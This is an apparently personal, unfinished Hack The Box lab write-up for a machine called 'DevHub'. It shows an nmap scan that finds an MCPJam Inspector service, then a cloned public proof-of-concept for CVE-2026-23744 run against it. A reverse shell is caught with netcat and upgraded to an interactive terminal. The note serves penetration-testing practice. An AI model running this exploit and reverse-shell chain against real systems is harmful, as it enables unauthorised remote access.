---
title: "DevHub"
kind: writeup
tags:
  - hack-the-box-labs
  - status/in-progress
  - writeup
  - linux
status: "In progress"
difficulty: "Easy"
date: 2026-06-14
reference: "DevHub"
database: "Hack The Box"
area: "Hack The Box Labs"
up: "[[Hack The Box]]"
notion-id: 37f759b9275180d282f2f523a7f876bc
---

# DevHub

In: [[Career]] / [[Hack The Box Labs]] / [[Hack The Box]]

## Nmap Scan

```bash
┌──(exp10i73r㉿kali)-[~]
└─$ nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap/nmap_full_scan 10.129.245.216
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-14 13:47 +0530
Nmap scan report for 10.129.245.216
Host is up (0.53s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
6274/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.99%I=7%D=6/14%Time=6A2E6423%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-cred
SF:entials:\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/htm
SF:l;\x20charset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Sun,\x2014\x20Jun\x2
SF:02026\x2008:22:52\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20ht
SF:ml>\n<html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20ch
SF:arset=\"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"
SF:image/svg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta
SF:\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale
SF:=1\.0\"\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20
SF:\x20\x20\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/
SF:index-DRYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:et\"\x20crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20<
SF:/head>\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x2
SF:0\x20</body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20C
SF:ontent\r\naccess-control-allow-credentials:\x20true\r\naccess-control-a
SF:llow-methods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\nc
SF:ontent-type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Sun,\x2014\x20
SF:Jun\x202026\x2008:22:54\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSP
SF:Request,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-c
SF:redentials:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,PO
SF:ST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20c
SF:harset=UTF-8\r\nDate:\x20Sun,\x2014\x20Jun\x202026\x2008:22:56\x20GMT\r
SF:\nConnection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 207.89 seconds

```

![[attachments/Hack The Box Labs/Hack The Box/DevHub/Screenshot_2026-06-14_at_13-59-41.png]]

![[attachments/Hack The Box Labs/Hack The Box/DevHub/Screenshot_2026-06-14_at_14-00-12.png]]

```bash
┌──(exp10i73r㉿kali)-[~/CVE]
└─$ git clone https://github.com/alisster00/CVE-2026-23744-RCE.git                          
Cloning into 'CVE-2026-23744-RCE'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 6 (delta 0), reused 6 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (6/6), done.
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/CVE]
└─$ cd CVE-2026-23744-RCE 
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/CVE/CVE-2026-23744-RCE]
└─$ ls
README.md  script.py
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/CVE/CVE-2026-23744-RCE]
└─$ python3 script.py 10.129.245.216:6274 -l 10.10.16.28 --lport 4444
[-] Cannot reach http://10.129.245.216:6274:6274
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/CVE/CVE-2026-23744-RCE]
└─$ python3 script.py http://10.129.245.216:6274 -l 10.10.16.28 --lport 4444
[-] Cannot reach http://http://10.129.245.216:6274:6274
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/CVE/CVE-2026-23744-RCE]
└─$ python3 script.py http://10.129.245.216 -l 10.10.16.28 --lport 4444 
[-] Cannot reach http://http://10.129.245.216:6274
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/CVE/CVE-2026-23744-RCE]
└─$ python3 script.py 10.129.245.216 -l 10.10.16.28 --lport 4444 
[*] MCPJam accessible at http://10.129.245.216:6274
[*] Target: http://10.129.245.216:6274
[*] Callback: 10.10.16.28:4444
[*] Sending payload to /api/mcp/connect...
[+] Payload sent!
[+] Check your listener for reverse shell

┌──(exp10i73r㉿kali)-[~/CVE/CVE-2026-23744-RCE]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.28] from (UNKNOWN) [10.129.245.216] 49370
bash: cannot set terminal process group (1059): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<or$ python3 -c 'import pty; pty.spawn("/bin/bash")'       
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                                      
┌──(exp10i73r㉿kali)-[~/CVE/CVE-2026-23744-RCE]
└─$ stty raw -echo; fg                         
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 

```
